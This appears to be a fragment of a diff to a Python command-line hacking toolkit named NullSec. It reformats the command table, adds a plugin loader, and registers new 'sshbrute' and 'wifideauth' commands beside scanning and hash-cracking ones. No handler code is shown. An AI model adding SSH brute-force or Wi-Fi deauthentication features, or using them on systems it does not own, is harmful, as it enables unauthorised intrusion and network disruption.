+        "exit": handle_exit,
+        "e": handle_exit,
+        "echo": handle_echo,
+        "cd": handle_cd,
+        "pwd": handle_pwd,
+        "help": handle_help,
+        "open": handle_open,
+        "ls": handle_ls,
+        "dir": handle_ls,
+        "ping": handle_ping,
+        "myip": handle_myip,
+        "dns": handle_dns,
+        "whois": handle_whois,
+        "portscan": handle_portscan,
+        "headers": handle_headers,
         "subdomains": handle_subdomains,
-        "sysinfo":    handle_sysinfo,
-        "fcheck":     handle_fcheck,
-        "encode":     handle_encode,
-        "decode":     handle_decode,
-        "rot":        handle_rot,
-        "hashcrack":  handle_hashcrack,
-        "jwt":        handle_jwt,
-        "geoip":      handle_geoip,
-        "url":        handle_urlencode,
-        "passcheck":  handle_passcheck,
+        "sysinfo": handle_sysinfo,
+        "fcheck": handle_fcheck,
+        "encode": handle_encode,
+        "decode": handle_decode,
+        "rot": handle_rot,
+        "hashcrack": handle_hashcrack,
+        "jwt": handle_jwt,
+        "geoip": handle_geoip,
+        "url": handle_urlencode,
+        "passcheck": handle_passcheck,
         "bannergrab": handle_bannergrab,
-        "strings":    handle_strings,
-        "hexdump":    handle_hexdump,
-        "theme":      handle_theme,
-        "changelog":  handle_changelog,
-        "back":       handle_back,
+        "strings": handle_strings,
+        "hexdump": handle_hexdump,
+        "sshbrute": handle_sshbrute,
+        "wifideauth": handle_wifideauth,
+        "theme": handle_theme,
+        "changelog": handle_changelog,
+        "back": handle_back,
     }
 
     # tab completion
     def completer(text, state):
         options = [c for c in commands if c.startswith(text)]
         return options[state] if state < len(options) else None
+
     readline.set_completer(completer)
     readline.parse_and_bind("tab: complete")
 
     while True:
+        from plugins import load_plugins, get_plugin_commands, call_plugin, PLUGINS
+
+        load_plugins()
+        plugin_commands = get_plugin_commands()
+
+        for p in PLUGINS:
+            for c in p.get("commands", []):
+                commands[c] = lambda args, p=p: p["handler"](args)
+
         uin = input(f"""
 {RED}┌──{RESET}({username_pc}{RED}@{RESET}{os_name}){RED}─{RESET}[~/{RED}Null{RESET}Sec {RED}{version}{RESET}]
 {RED}│{RESET}
@@ -854,14 +1179,19 @@ def input_loop():
             continue
 
         parts = uin.split()
-        cmd   = parts[0].lower()
-        args  = parts[1:]
+        cmd = parts[0].lower()
+        args = parts[1:]
 
         action = commands.get(cmd)
         if action:
             action(args)
+        elif cmd in plugin_commands:
+            call_plugin(cmd, args)
         else:
-            console.print(Text.from_ansi(f"[{RED}!{RESET}] Unknown command: {cmd} — type help"))
+            console.print(
+                Text.from_ansi(f"[{RED}!{RESET}] Unknown command: {cmd} — type help")
+            )
+
 
 def main():
     clear()
@@ -874,9 +1204,11 @@ def main():
         if str(e) == "__back__":
             # return to launcher
             import launcher
+
             launcher.main()
         else:
             sys.exit()
+
 
 if __name__ == "__main__":
     main()
